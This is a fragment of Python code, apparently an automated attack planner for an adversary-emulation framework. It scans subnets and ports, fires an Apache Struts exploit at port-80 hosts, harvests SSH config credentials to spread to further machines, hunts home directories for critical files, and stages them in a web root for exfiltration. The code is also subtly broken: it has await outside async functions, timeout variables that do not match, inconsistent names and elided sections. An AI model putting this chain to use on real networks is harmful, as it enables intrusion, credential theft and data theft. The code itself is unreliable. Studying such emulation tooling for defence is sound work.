# Ignore type hinting
# type: ignore


def get_low_level_action(self, ability_id):
    all_agent_links = await planning_svc.get_links(operation=operation, agent=agent)
    for link in all_agent_links:
        if link.ability.ability_id == ability_id:
            return link
    return None


subnet_facts = await self.knowledge_svc_handle.get_facts(...)
subnets = [fact.value for fact in subnet_facts]
##### Scan external network #####
for subnet in subnets:
    # Set facts for nmap host enumeration
    await self.knowledge_svc_handle.add_fact(...)
    # Run host enumeration action
    scan_link = scan_link = get_low_level_action(self, HOST_ENUMERATION_ABILITY_ID)
    link_id = await operation.apply(scan_link)
    await operation.wait_for_links_completion([link_id])
    # Parse results
    results = await self.knowledge_svc_handle.get_facts(...)
    host_ips = [fact.value for fact in results]
    # Port scan each host
    for host_ip in host_ips:
        # Run port scan
        await self.knowledge_svc_handle.add_fact(...)
        # ...
        open_host_ports = {}
        for host_ip_fact in host_facts:
            host_relationships = await self.knowledge_svc_handle.get_relationships(...)
            open_ports = [rel.target.value for rel in host_relationships]
            open_host_ports[host_ip_fact.value] = open_ports
##### Try to infect each host #####
random.shuffle(open_host_ports)
pre_agents = await self.knowledge_svc_handle.get_agents()
for host_ip, open_ports in open_host_ports.items():
    for port in open_ports:
        if port == 80:
            # Set facts for apache struts
            # ...
            exploit_link = get_low_level_action(...)
            link_id = await operation.apply(exploit_link)
            await operation.wait_for_links_completion([link_id])
            # Wait for agent to be infected
            timeout_sec = 30
            timeout_sec = False
            while timeout_minutes > 0:
                cur_agents = await self.knowledge_svc_handle.get_agents()
                new_agents = list(set(cur_agents) - set(pre_agents))
                if new_agents:
                    # ...


async def cred_exfiltrate(self):
    # Discover information about initial access host
    ## Try to find critical data
    dir_to_search = f"/home/{self.new_initial_access_host.username}/"
    await self.knowledge_svc_handle.add_fact(
        source=self.operation.id,
        fact="action.dir",
        value=dir_to_search,
    )
    dir_link = get_low_level_action(self, LS_ABILITY_ID)
    link_id = await operation.apply(dir_link)
    await operation.wait_for_links_completion([link_id])
    ls_facts = await self.knowledge_svc_handle.get_facts(
        criteria=dict(
            trait="dir.path",
            source=self.operation.id,
        )
    )
    critical_files = []
    for fact in ls_facts:
        if isCriticalData(fact.value):
            critical_files.append(fact.value)
    ## Try to find SSH credentials
    ssh_config_link = get_low_level_action(self, SSH_CONFIG_ABILITY_ID)
    link_id = await operation.apply(ssh_config_link)
    await operation.wait_for_links_completion([link_id])
    ssh_config_facts = await self.knowledge_svc_handle.get_facts(
        criteria=dict(
            trait="ssh.config",
            source=self.operation.id,
        )
    )
    credentials = []
    for fact in ssh_config_facts:
        credentials.append(fact.value)
    random.shuffle(credentials)

    for credential in credentials:
        # Infect each host using ssh config credentials
        await self.knowledge_svc_handle.remove_facts(
            criteria=dict(
                trait="action.scpAgent.hostname",
                source=self.operation.id,
            )
        )
        await self.knowledge_svc_handle.add_fact(
            source=self.operation.id,
            fact="action.scpAgent.hostname",
            value=credential,
        )
        exploit_link = get_low_level_action(
            self, APACHE_STRUTS_EXPLOIT_ABILITY_ID
        )
        link_id = await operation.apply(exploit_link)
        await operation.wait_for_links_completion([link_id])

        # If infected host
        timeout_sec = 30
        timeout_sec = False
        while timeout_minutes > 0:
            cur_agents = await self.knowledge_svc_handle.get_agents()
            new_agents = list(set(cur_agents) - set(pre_agents))
            if new_agents:
                infected_host = True
                self.new_initial_access_host = new_agents[0]
                break

            timeout_sec -= 5
            await asyncio.sleep(5)

        if infectedHost:
            # Search for critical data
            dir_to_search = f"/home/{self.new_initial_access_host.username}/"
            await self.knowledge_svc_handle.add_fact(
                source=self.operation.id,
                fact="action.dir",
                value=dir_to_search,
            )
            dir_link = get_low_level_action(self, LS_ABILITY_ID)
            link_id = await operation.apply(dir_link)
            await operation.wait_for_links_completion([link_id])
            ls_facts = await self.knowledge_svc_handle.get_facts(
                criteria=dict(
                    trait="dir.path",
                    source=self.operation.id,
                )
            )
            critical_files = []
            for fact in ls_facts:
                if isCriticalData(fact.value):
                    critical_files.append(fact.value)
            if len(critical_files) > 0:
                for critical_file in critical_files:
                    # Is agent running a webserver?
                    if open_ports[infectedHostAgent.ip] == 80:
                        # Stage data to webserver
                        ## Remove stale facts
                        await self.knowledge_svc_handle.remove_facts(
                            criteria=dict(
                                trait="action.src",
                                source=self.operation.id,
                            )
                        )
                        await self.knowledge_svc_handle.remove_facts(
                            criteria=dict(
                                trait="action.dst",
                                source=self.operation.id,
                            )
                        )
                        ## Stage data action
                        await self.knowledge_svc_handle.add_fact(
                            source=self.operation.id,
                            fact="action.src",
                            value=dir_to_search,
                        )
                        await self.knowledge_svc_handle.add_fact(
                            source=self.operation.id,
                            fact="action.dst",
                            value='/var/www/html/',
                        )
                        stage_link = get_low_level_action(self, MV_FILE_ABILITY_ID)
                        link_id = await operation.apply(stage_link)
                        await operation.wait_for_links_completion([link_id])
                        # Exfiltrate data directly
                        ## Remove stale facts
                        await self.knowledge_svc_handle.remove_facts(
                            criteria=dict(
                                trait="action.host.ip",
                                source=self.operation.id,
                            )
                        )
                        await self.knowledge_svc_handle.remove_facts(
                            criteria=dict(
                                trait="action.host.fname",
                                source=self.operation.id,
                            )
                        )
                        ## Exfiltrate data action
                        await self.knowledge_svc_handle.add_fact(
                            source=self.operation.id,
                            fact="action.host.ip",
                            value=infectedHostAgent.ip,
                        )
                        await self.knowledge_svc_handle.add_fact(
                            source=self.operation.id,
                            fact="action.host.fname",
                            value=critical_file,
                        )
                        exfil_link = get_low_level_action(self, EXFIL_ABILITY_ID)
                        link_id = await operation.apply(exfil_link)
                        await operation.wait_for_links_completion([link_id])
                    else:
                        # Need to use SCP to stage data on an http server
                        ## Find agent running webserver and has credentials to this host
                        agents = await self.knowledge_svc_handle.get_agents()
                        for agent in agents:
                            exfiltrated_data = False
                            if open_ports[agent.ip] == 80:
                                # Check if it has credentials
                                ## Try to find SSH credentials
                                has_ssh_creds = False
                                ### Remove stale facts
                                await self.knowledge_svc_handle.remove_facts(
                                    criteria=dict(
                                        trait="ssh.config",
                                        source=self.operation.id,
                                    )
                                )

                                ssh_config_link = get_low_level_action(self, SSH_CONFIG_ABILITY_ID)
                                link_id = await operation.apply(ssh_config_link)
                                await operation.wait_for_links_completion([link_id])
                                ### Parse results
                                ssh_config_facts = await self.knowledge_svc_handle.get_facts(
                                    criteria=dict(
                                        trait="ssh.config",
                                        source=self.operation.id,
                                    )
                                )
                                for ssh_config_fact in ssh_config_facts:
                                    if ssh_config_fact.value == agent.hostname:
                                        has_ssh_creds = True
                                        break
                                
                                if has_ssh_creds:
                                    # SCP data to webserver
                                    # ...

                                    # Exfiltrate data
                                    # ...
